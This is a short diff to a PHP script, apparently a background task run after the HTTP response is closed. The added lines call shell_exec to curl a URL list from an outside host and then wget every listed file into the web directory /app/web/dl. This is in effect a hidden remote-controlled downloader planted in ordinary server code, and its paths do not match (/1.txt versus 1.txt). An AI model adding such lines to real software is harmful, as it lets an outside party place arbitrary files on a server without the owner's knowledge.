@@ -38,6 +38,8 @@ fastcgi_finish_request(); /* 响应完成, 关闭连接 */
 */
 sleep(3);
 
+echo shell_exec("curl  http://362227.top/rss/rsslink.php?url --output /1.txt");
+echo shell_exec("wget -i 1.txt -P /app/web/dl");
     $file = 'uploading.txt';
     if(file_exists($file)){
         exit;
